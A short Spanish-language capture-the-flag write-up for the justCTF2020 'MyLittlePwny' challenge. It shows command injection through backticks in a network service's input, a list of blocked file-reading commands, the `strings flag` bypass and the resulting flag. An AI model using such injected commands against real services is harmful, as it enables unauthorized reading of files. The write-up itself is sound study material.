---
title: justCTF2020 - MyLittlePwny
excerpt: "Ponies like only one type of numbers!"
date: 2021-01-31
categories: [CTF, PWN]
tags: [CTF, justCTF2020, PWN]
---
`pwn`
> Ponies like only one type of numbers!

---

# Descubrir la vulnerabilidad

En este reto no se nos entrega el código fuente lo que me llama la atención.

Me conecto al servidor con netcat y me aparece un prompt, lo primero que se me viene a la mente es "format string" pero tras probar con "%x" aparece un pony que me dice "< I can't swear ;( >". Pruebo con una cadena larga de caracteres por si hubiera un BoF pero lo unico que consigo es que un pony me repita la cadena.

Comienzo a probar caracteres hasta llegar al backtick, entonces me aparece este error: "/bin/sh: 2: Syntax error: EOF in backquote substitution". Entonces me doy cuenta de que puedo inyectar comandos, pruebo \`ls\` y el pony me dice: "< bin flag lib lib64 server.py usr >" pero intento \`cat flag\` y el pony me dice: "< I like cats :) >"

\`less flag\` 	No less, no more!
	
\`more flag\` 	No less, no more!

\`tail flag\` 	I have a ponytail!

\`head flag\` 	My head is in the clouds :heart:

\`grep flag\`	Yay! I love grapes :yum:

\`sed flag\`	You make me sad :(

\`awk flag\`	This is so awkward...

Hasta que doy con la clave:

\`strings flag\`

Flag: justCTF{p0nY_t4lEs_b3giN5_h3r3}



